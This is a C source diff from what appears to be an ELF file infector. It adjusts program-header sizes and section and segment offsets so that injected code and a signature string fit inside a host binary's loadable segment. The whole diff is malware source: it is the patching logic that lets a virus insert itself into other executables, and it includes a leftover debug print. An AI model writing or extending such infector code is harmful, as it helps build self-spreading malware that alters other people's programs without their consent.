@@ -8,11 +8,11 @@ void		*update_segment_sz(void *src, void **dst, Elf64_Phdr *segment)
 	ft_memcpy(*dst, src, (unsigned long)&segment->p_filesz - (unsigned long)src);
 	*dst += (unsigned long)&segment->p_filesz - (unsigned long)src;
 	src = &segment->p_filesz;
-	p_filesz = segment->p_filesz + ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE;
+	p_filesz = segment->p_filesz + ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + ft_strlen(SIGNATURE);
 	ft_memcpy(*dst, &p_filesz, sizeof(segment->p_filesz));
 	*dst += sizeof(segment->p_filesz);
 	src += sizeof(segment->p_filesz);
-	p_memsz = segment->p_memsz + ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE;
+	p_memsz = segment->p_memsz + ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + ft_strlen(SIGNATURE);
 	ft_memcpy(*dst, &p_memsz, sizeof(segment->p_memsz));
 	*dst += sizeof(segment->p_memsz);
 	src += sizeof(segment->p_memsz);
@@ -24,9 +24,14 @@ void		*add_padding_segments(t_elf *elf, void *src, void **dst, int nb_zero)
 	int				size;
 	Elf64_Off		shoff;
 	Elf64_Phdr	*next = elf->pt_load + 1;
+	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
 
-	size = ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + nb_zero;
-	shoff = elf->header->e_shoff + size;
+	size = ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + ft_strlen(SIGNATURE) + nb_zero - previous_padding;
+	int		add = (elf->pt_load->p_offset + elf->pt_load->p_filesz + size) - next->p_offset;
+	ft_putstr("test: ");
+	ft_putnbr(add);
+	ft_putstr("\n");
+	shoff = elf->header->e_shoff + add;
 	ft_memcpy(*dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
 	*dst += (unsigned long)&elf->header->e_shoff - (unsigned long)src;
 	ft_memcpy(*dst, &shoff, sizeof(shoff));
@@ -36,7 +41,7 @@ void		*add_padding_segments(t_elf *elf, void *src, void **dst, int nb_zero)
 	{
 		if (elf->segments[i].p_offset > (unsigned long)elf->pt_load->p_offset + elf->pt_load->p_filesz)
 		{
-			shoff = elf->segments[i].p_offset + size;
+			shoff = elf->segments[i].p_offset + add;
 			ft_memcpy(*dst, src, (unsigned long)&elf->segments[i].p_offset - (unsigned long)src);
 			*dst += (unsigned long)&elf->segments[i].p_offset - (unsigned long)src;
 			ft_memcpy(*dst, &shoff, sizeof(shoff));
@@ -53,13 +58,16 @@ void		*add_padding_sections(t_elf *elf, void *src, void **dst, int nb_zero)
 {
 	int				size;
 	Elf64_Off		shoff;
+	Elf64_Phdr	*next = elf->pt_load + 1;
+	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
 
-	size = ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + nb_zero;
+	size = ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + ft_strlen(SIGNATURE) + nb_zero - previous_padding;
+	int		add = (elf->pt_load->p_offset + elf->pt_load->p_filesz + size) - next->p_offset;
 	for (int i = 0; i < elf->header->e_shnum; i++)
 	{
 		if ((unsigned long)elf->sections[i].sh_offset > elf->pt_load->p_offset + elf->pt_load->p_filesz)
 		{
-			shoff = elf->sections[i].sh_offset + size;
+			shoff = elf->sections[i].sh_offset + add;
 			ft_memcpy(*dst, src, (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src);
 			*dst += (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src;
 			ft_memcpy(*dst, &shoff, sizeof(shoff));
